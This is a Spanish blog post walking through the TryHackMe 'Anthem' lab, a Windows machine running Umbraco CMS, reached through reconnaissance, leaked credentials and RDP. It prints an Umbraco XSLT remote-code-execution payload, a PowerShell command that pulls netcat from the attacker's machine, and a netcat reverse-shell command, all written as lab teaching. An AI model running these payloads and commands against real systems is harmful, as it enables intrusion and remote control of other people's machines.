@@ -1,0 +1,1477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>TryHackMe - Anthem</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>TryHackMe - Anthem | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="TryHackMe - Anthem" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel fácil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP." />
+<meta property="og:description" content="Máquina Windows nivel fácil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP." />
+<link rel="canonical" href="http://localhost:4000/thm/anthem" />
+<meta property="og:url" content="http://localhost:4000/thm/anthem" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_gif.gif" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-02-05T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_gif.gif" />
+<meta property="twitter:title" content="TryHackMe - Anthem" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-02-05T00:00:00-08:00","datePublished":"2021-02-05T00:00:00-08:00","description":"Máquina Windows nivel fácil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP.","headline":"TryHackMe - Anthem","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_gif.gif","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/thm/anthem"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/thm/anthem"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">TryHackMe - Anthem</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-02-05">05 Feb 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_gif.gif" alt="TryHackMe - Anthem">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel fácil. Jugaremos mucho a encontrar cosas en la web, caeremos en un Rabbit Hole con Umbraco (lindo, aprendimos bastante de esto) y accederemos remotamente a escritorios ajenos usando RDP.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_anthem.png" alt="anthem_anthem" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p>El formato de tener que publicar el proceso, pero escondiendo la mayoría no me gusta nada. Pero toca hacerlo, ya que al parecer el tema “retirar” máquinas en <code>TryHackMe</code> no es un «tema» de conversación :P</p>
+
+<p>Nos encontraremos con un servidor web alojando el CMS <code>Umbraco</code>, antes de abordarlo debemos recorrer las páginas e ir encontrando <code>flags</code> o <code>ítems</code>. Una vez encontradas, nos enfrentaremos a un lindo <code>Rabbit Hole</code> en la explotación del CMS <code>Umbraco</code>. Caeremos en cuenta que tenemos credenciales y un servicio para acceder remotamente a la máquina. Así encontraremos el flag <code>user.txt</code>.</p>
+
+<p>Una vez dentro, enumeraremos y tendremos una carpeta oculta, la cual contiene un archivo al que no tenemos acceso. Validando los permisos del archivo vemos que somos el propietario, pero no tenemos acciones sobre él. Mediante <code>icacls</code> gestionaremos los permisos que tenemos hacia ese archivo y lograremos ver su contenido, tendremos una contraseña que nos servirá para entrar al escritorio remoto del usuario <code>Administrator</code>.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<h3 id="qué-haremos">¿Qué haremos?</h3>
+
+<p>El formato de <code>TryHackMe</code> es muy diferente al de <code>HackTheBox</code>, ya que algunas máquinas tienen preguntas que deben ser respondidas según vayamos avanzando con la explotación, así que respetaremos eso (también para probar :P).</p>
+
+<ul>
+  <li><a href="#website-analysis">Website Analysis</a>.</li>
+  <li><a href="#spot-flags">Spot the flags</a>.</li>
+  <li><a href="#final-stage">Final Stage</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="website-analysis">Website Analysis <a href="#website-analysis">#</a></h2>
+
+<p>Realizaremos un escaneo de puertos para saber que servicios está corriendo la máquina.</p>
+
+<pre><code class="language-bash">❭ nmap -p- --open -v 10.10.87.37 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat initScan 
+# Nmap 7.80 scan initiated Thu Feb  4 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.87.37
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.87.37 ()    Status: Up
+Host: 10.10.87.37 ()    Ports: **/open/tcp//http///, ****/open/tcp//ms-wbt-server///    Ignored State: filtered (65533)
+# Nmap done at Thu Feb  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 585.65 seconds
+</code></pre>
+
+<p>Perfecto, tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>** (Pero creo que se entiende cual es)</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Protocolo_de_transferencia_de_hipertexto">HTTP</a></strong></td>
+    </tr>
+    <tr>
+      <td><em>**</em></td>
+      <td style="text-align: left"><strong><a href="https://docs.microsoft.com/en-us/windows/win32/termserv/remote-desktop-protocol">RPD</a></strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Hagamos nuestro escaneo de scripts y versiones en base a cada puerto, con ello obtenemos informacion mas detallada de cada servicio:</p>
+
+<pre><code class="language-bash">❭ nmap -p **,**** -sC -sV 10.10.87.37 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">❭ cat portScan 
+# Nmap 7.80 scan initiated Thu Feb  4 25:25:25 2021 as: nmap -p **,**** -sC -sV -oN portScan 10.10.87.37
+Nmap scan report for 10.10.87.37
+Host is up (0.34s latency).
+
+PORT     STATE SERVICE       VERSION
+**/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+| http-robots.txt: 4 disallowed entries 
+|_/***/ /*****/ /umbraco/ /umbraco_client/
+|_http-title: Anthem.com - Welcome to our blog
+****/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: WIN-LU09299160F
+|   NetBIOS_Domain_Name: WIN-LU09299160F
+|   NetBIOS_Computer_Name: WIN-LU09299160F
+|   DNS_Domain_Name: WIN-LU09299160F
+|   DNS_Computer_Name: WIN-LU09299160F
+|   Product_Version: 10.0.17763
+|_  System_Time: 2021-02-04T22:17:08+00:00
+| ssl-cert: Subject: commonName=WIN-LU09299160F
+| Not valid before: 2021-01-02T15:57:43
+|_Not valid after:  2021-07-04T15:57:43
+|_ssl-date: 2021-02-04T22:17:23+00:00; 0s from scanner time.
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Feb  4 25:25:25 2021 -- 1 IP address (1 host up) scanned in 31.22 seconds
+</code></pre>
+
+<p>Obtenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">**</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Microsoft HTTPAPI httpd 2.0</td>
+    </tr>
+    <tr>
+      <td style="text-align: left"><em>**</em></td>
+      <td style="text-align: left">RDP</td>
+      <td style="text-align: left">Microsoft Terminal Services</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Empecemos a responder preguntas :P</p>
+
+<p>…</p>
+
+<h4 id="what-port-is-for-the-web-server">What port is for the web server?</h4>
+
+<p>Bueno, como vimos anteriormente, esta sobre el puerto <code>**</code> (Igual por algún lado creo que se filtrara :P).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80.png" alt="anthem_page80" /></p>
+
+<h4 id="what-port-is-for-remote-desktop-service">What port is for remote desktop service?</h4>
+
+<p>También lo vimos en el puerto <code>****</code>.</p>
+
+<h4 id="what-is-a-possible-password-in-one-of-the-pages-web-crawlers-check-for">What is a possible password in one of the pages web crawlers check for?</h4>
+
+<p>Enumerando (y fijándonos en el escaneo anterior) con <code>robots.txt</code> tenemos lo que parece ser una contraseña: <code>****************</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_robotsTXT.png" alt="anthem_page80_robotsTXT" /></p>
+
+<h4 id="what-cms-is-the-website-using">What CMS is the website using?</h4>
+
+<p>Apoyados en la imagen anterior (y también del escaneo) sabemos que está usando el CMS <a href="https://es.wikipedia.org/wiki/Umbraco">Umbraco</a>.</p>
+
+<h4 id="what-is-the-domain-of-the-website">What is the domain of the website?</h4>
+
+<p>Por varios sitios (y en el escaneo :P :P) vemos el dominio <code>anthem.com</code>.</p>
+
+<h4 id="whats-the-name-of-the-administrator">What’s the name of the Administrator</h4>
+
+<p>Acá usando la ayuda que nos brinda, indica que debemos buscar :O, pero ni idea… Después de leer atentamente, los compañeros de trabajo le dedican un poema al admin:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_poem.png" alt="anthem_page80_poem" /></p>
+
+<p>Buscando en internet la frase, tenemos el nombre del autor, ese resulta ser el admin (:(</p>
+
+<h4 id="can-we-find-find-the-email-address-of-the-administrator">Can we find find the email address of the administrator?</h4>
+
+<p>Dado que vimos un correo, pero ese no es el indicado, podemos pensar que existe un patrón en los correos, teniendo el nombre podemos generar uno:</p>
+
+<ul>
+  <li>Correo que encontramos pero no es: <strong>JD@anthem.com</strong>.</li>
+  <li>Correo generado con el patron (iniciales del nombre): <strong>**@anthem.com</strong>.</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="spot-flags">Spot Flags <a href="#spot-flags">#</a></h2>
+
+<pre><code class="language-bash">Our beloved admin left some flags behind that 
+we require to gather before we proceed to the next task..
+</code></pre>
+
+<p>Recorriendo la pagina, vemos algunas banderas en formato CTF, tales como <code>HTB{...}</code>, encontremoslas.</p>
+
+<h4 id="what-is-flag-1">What is flag 1?</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag1.png" alt="anthem_page80_flag1" /></p>
+
+<h4 id="what-is-flag-2">What is flag 2?</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag2.png" alt="anthem_page80_flag2" /></p>
+
+<h4 id="what-is-flag-3">What is flag 3?</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag3.png" alt="anthem_page80_flag3" /></p>
+
+<h4 id="what-is-flag-4">What is flag 4?</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_flag4.png" alt="anthem_page80_flag4" /></p>
+
+<p>…</p>
+
+<h2 id="final-stage">Final Stage <a href="#final-stage">#</a></h2>
+
+<pre><code class="language-bash">Let's get into the box using the intel we gathered.
+</code></pre>
+
+<p>Si intentamos logearnos en el apartado de <code>/umbraco</code> con las credenciales que tenemos volando, logramos entrar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_umbraco.png" alt="anthem_page80_umbraco" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_page80_umbraco_login.png" alt="anthem_page80_umbraco_login" /></p>
+
+<p>…</p>
+
+<ul>
+  <li><a href="#umbraco-rabbit-hole">Rabbit hole Umbraco</a>.</li>
+  <li><a href="#access-with-rdp">Access with RDP</a>.</li>
+</ul>
+
+<p>…</p>
+
+<h3 id="umbraco-rabbit-hole">▿ Rabbit hole (<code>Umbraco exploitation</code>)</h3>
+
+<blockquote>
+  <p>Que me gusto, aunque hubiera sido un rabbit hole :P</p>
+</blockquote>
+
+<p>Recorriendo la página, podemos encontrar la versión del software, en este caso: <code>Umbraco versión 7.15.4</code>. Buscando exploits sobre esa versión encontramos uno con el que ya había estado jugando en una máquina de <code>HackTheBox</code>, concretamente en <code>Remote</code> (de la cual <a href="https://lanzt.github.io/blog/htb/HackTheBox-Remote">tengo un writeup</a>, el cual me sirvió para guiarme sobre como conseguir una reverse Shell).</p>
+
+<p>(La mayoría de referencias las reutilizaré de ese writeup, solo pa decirlo :P)</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/46153">Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution</a>.</li>
+</ul>
+
+<p>Bien, descargándolo y viendo el código, debemos modificar algunas líneas, tales como:</p>
+
+<ul>
+  <li>login: el usuario (email).</li>
+  <li>password: pues la password :P</li>
+  <li>host: donde está alojado el CMS <code>Umbraco</code> (IP de la máquina).</li>
+</ul>
+
+<p>El proceso de explotación se da por la falta de sanitizacion de la variable <code>ctl00$body$xsltSelection</code> del archivo <code>/umbraco/developer/Xslt/xsltVisualize.aspx</code>. En el que podemos enviar nuestro payload sin ningún problema.</p>
+
+<p>El payload que usa el exploit es este:</p>
+
+<pre><code class="language-py">payload = '&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" \\
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \\
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;\\
+&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() \\
+{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\
+ proc.StartInfo.FileName = "calc.exe"; proc.StartInfo.Arguments = cmd;\\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\
+ &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;\\
+ &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ';
+</code></pre>
+
+<p>Como prueba de concepto, abre una calculadora, pero nosotros no queremos eso, intentemos ejecutar el comando <code>whoami</code>:</p>
+
+<p>(Algo importante es que al final debemos indicarle que nos muestre la respuesta del request)</p>
+
+<pre><code class="language-py"># Step 4 - Launch the attack
+r4 = s.post(url_xslt,data=data,headers=headers);
+
+print(r4.text)
+</code></pre>
+
+<p>Ahora si, el payload quedaria:</p>
+
+<pre><code class="language-py">payload = '&lt;?xml version="1.0"?&gt;&lt;xsl:stylesheet version="1.0" \\
+xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \\
+xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"&gt;\\
+&lt;msxsl:script language="C#" implements-prefix="csharp_user"&gt;public string xml() \\
+{ string cmd = ""; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\
+ proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "whoami";\\
+ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\
+ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\
+ &lt;/msxsl:script&gt;&lt;xsl:template match="/"&gt; &lt;xsl:value-of select="csharp_user:xml()"/&gt;\\
+ &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; ';
+</code></pre>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/7160187/standardoutput-readtoend-hangs">How works <strong>startInfo.FileName</strong> and <strong>startInfo.Arguments</strong></a>.</li>
+</ul>
+
+<p>En la respuesta tenemos:</p>
+
+<pre><code class="language-bash">nada u.u
+</code></pre>
+
+<p>Básicamente buscando en internet, tenemos que debemos agregarlo algo a la cadena, el tema es que ejecuta <code>cmd.exe</code>, pero se queda con la consola abierta y nunca veremos el output.</p>
+
+<p>En <code>Stack Overflow</code> alguien agrego que usar <code>/c</code> al inicio de la cadena le indica a la consola que debe cerrarse apenas ejecute el comando. Probémoslo:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/15061854/how-to-pass-multiple-arguments-in-processstartinfo#answer-15062027">How to pass mult args in <strong>proc.StartInfo</strong></a>.</li>
+</ul>
+
+<pre><code class="language-bash">...
+proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = "/c whoami";\
+...
+</code></pre>
+
+<p>Ejecutamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_whoami.png" alt="anthem_bash_pyRCE_whoami" /></p>
+
+<p>Perfecto, ahora que tenemos ejecución de comandos, probemos cositas y veamos como conseguir la shell…</p>
+
+<p>Debemos subir el binario <code>nc</code> a la maquina, nos apoyaremos de <code>PowerShell</code> para hacerlo:</p>
+
+<p>▸ Listamos el directorio <code>TEMP</code>:</p>
+
+<pre><code class="language-py">...
+proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c dir ..\..\..\\Windows\\TEMP";\
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_dirTEMP.png" alt="anthem_bash_pyRCE_dirTEMP" /></p>
+
+<p>▸ Ponernos en escucha donde tenemos el binario <code>nc</code>:</p>
+
+<pre><code class="language-bash">❭ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+</code></pre>
+
+<p>▸ Agregamos la linea que va a descargar el binario y lo guardara en la carpeta <code>TEMP</code> del sistema:</p>
+
+<pre><code class="language-py">...
+proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c powershell IWR -uri http://10.2.65.117:8000/nc64.exe -OutFile c:\\Windows\\TEMP\\nc.exe";\
+...
+</code></pre>
+
+<p>▸ Listamos el directorio <code>TEMP</code> para validar:</p>
+
+<pre><code class="language-py">...
+proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c dir ..\..\..\\Windows\\TEMP";\
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_dirTEMP_nc.png" alt="anthem_bash_pyRCE_dirTEMP_nc" /></p>
+
+<p>Nice, no sé por qué solo se muestra nuestro binario, pero bueno, sabemos que esta, ahora ejecutémoslo:</p>
+
+<p>▸ Nos ponemos en escucha:</p>
+
+<pre><code class="language-bash">❭ nc -lvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>▸ Le indicamos que nos genere la Reverse Shell:</p>
+
+<pre><code class="language-py">...
+proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = @"/c ..\..\..\\Windows\\TEMP\\nc.exe 10.2.65.117 4433 -e cmd.exe";\
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_pyRCE_revshell.png" alt="anthem_bash_pyRCE_revshell" /></p>
+
+<p>Perfectooooooooooooooooooo, tamos dentro pai (:</p>
+
+<p>Enumerando usuarios tenemos uno conocido:</p>
+
+<pre><code class="language-powershell">c:\&gt;net user
+
+User accounts for \\
+
+-------------------------------------------------------------------------------
+Administrator            DefaultAccount           Guest                    
+**** (acá ta el user u.u)                       WDAGUtilityAccount
+</code></pre>
+
+<p>Después de un rato decidí probar con el puerto <code>RDP</code> pa ver si lográbamos entrar, ya que por este método no conseguí nada útil, simplemente un directorio oculto con un archivo al que no podemos acceder, pero de esto hablaremos un poco más adelante.</p>
+
+<p><strong>Final del rabbit hole :P (al menos vimos como entrar a la máquina explotando <code>Umbraco</code></strong></p>
+
+<p>El tema es que en las preguntas, después de haber encontrado las flags, nos pedía la de <code>user.txt</code>, se me hizo raro en el momento (y también cuando hicimos <code>whoami</code> hubiera sido un indicio de que íbamos por otro camino), pero pues no le puse cuidado y pueeeeeeees la máquina no está hecha para entrar por este lado (o pues no logre moverme al usuario necesario desde dentro)…</p>
+
+<h3 id="access-with-rdp">▿ Acceso con RDP a la máquina</h3>
+
+<p>Entonces :( si recordamos, tenemos el puerto <code>****</code> (RDP) abierto. Este puerto nos permite conectarnos de manera remota a un computador. Intentémoslo :O</p>
+
+<p>Encontramos esta herramienta: <code>remmina</code>.</p>
+
+<ul>
+  <li><a href="https://opensource.com/article/18/6/linux-remote-desktop">How to connect to a remote desktop from Linux.</a></li>
+</ul>
+
+<p>Después de instalarla, la ejecutamos e ingresamos la IP de la máquina:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaIP.png" alt="anthem_bash_remminaIP" /></p>
+
+<p>Damos <code>enter</code>, aceptamos el certificado y a continuación nos pide las credenciales del usuario:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaLogin.png" alt="anthem_bash_remminaLogin" /></p>
+
+<p>Estando dentro (supongo que no me cargo el fondo de pantalla :P):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop.png" alt="anthem_bash_remminaDesktop" /></p>
+
+<h4 id="gain-initial-access-to-the-machine-what-is-the-contents-of-usertxt">Gain initial access to the machine, what is the contents of user.txt?</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_user.png" alt="anthem_bash_remminaDesktop_user" /></p>
+
+<h4 id="can-we-spot-the-admin-password">Can we spot the admin password?</h4>
+
+<p>Enumerando la máquina, encontramos un folder oculto en la raiz del sistema.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backupfolder.png" alt="anthem_bash_remminaDesktop_backupfolder" /></p>
+
+<p>Dentro tenemos un archivo, pero que al intentar abrilo, no nos deja por falta de permisos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backup_restoreTXT.png" alt="anthem_bash_remminaDesktop_backup_restoreTXT" /></p>
+
+<p>Si revisamos el <code>owner</code> del archivo con el comando <code>dir /q</code>, vemos que somos nosotros, podemos usar <code>icacls</code> para validar que permisos tenemos sobre el archivo:</p>
+
+<pre><code class="language-powershell">c:\backup&gt;icacls restore.txt
+Successfully processed 1 files; Failed processing 0 files
+</code></pre>
+
+<p>Bien, pues siendo los propietarios del archivo podemos cambiarle los permisos, indiquémosle con <code>icacls</code> que le dé permisos de modificación sobre el archivo a nuestro usuario:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_backup_restoreTXT_done.png" alt="anthem_bash_remminaDesktop_backup_restoreTXT_done" /></p>
+
+<ul>
+  <li><a href="https://www.smythsys.es/11828/icacls-listar-los-permisos-de-directorios-en-windows-y-ver-a-que-carpetas-puede-acceder-un-usuario/">Info sobre <strong>ICACLS</strong> y gestion de permisos</a>.</li>
+</ul>
+
+<p>Perfecto, tenemos una string que parece una contraseña :P</p>
+
+<h4 id="escalate-your-privileges-to-root-what-is-the-contents-of-roottxt">Escalate your privileges to root, what is the contents of root.txt?</h4>
+
+<p>Migramos al usuario <code>Administrator</code> y tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/THM/anthem/anthem_bash_remminaDesktop_adminLogin.png" alt="anthem_bash_remminaDesktop_adminLogin" /></p>
+
+<p>Y listos, podemos ver la flag de <code>root.txt</code>; hemos terminado (:</p>
+
+<p>…</p>
+
+<p>Máquina muy de jugar (CTF), me estoy enfocando en máquinas Windows, ya que intente una nivel difícil en <code>HackTheBox</code> y me exploto la cabeza, muy bajo nivel para meterle.</p>
+
+<p>Me hubiera gustado que la ruta hubiera sido explotar <code>Umbraco</code>, de alguna forma encontrar la contraseña del usuario y ahí si hacer uso del puerto <code>RDP</code>… Pero bueno, no pasa nada, igual se aprendió :P</p>
+
+<p>Me gusto el uso de <code>icacls</code> para gestionar permisos y entiendo que es superútil en entornos reales.</p>
+
+<p>Muchas gracias por leer y como siempre… A seguir rompiendo todo (:</p>
+
+</div>
+
